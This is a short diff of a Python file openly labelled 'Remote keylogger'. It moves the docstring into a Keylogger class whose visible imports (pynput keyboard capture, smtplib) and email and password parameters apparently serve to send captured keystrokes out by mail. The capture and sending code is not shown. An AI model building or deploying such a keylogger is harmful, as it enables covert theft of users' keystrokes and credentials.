@@ -1,7 +1,4 @@
 #!/usr/bin/env python3
-"""
-Remote keylogger.
-"""
 import pynput.keyboard
 import threading
 import smtplib
@@ -14,6 +11,9 @@ import platform
 import getpass
 
 class Keylogger:
+    """
+    Remote keylogger.
+    """
     def __init__(self, interval, email, password):
         self.log = "[+] BEGIN LOG "
         self.interval = interval
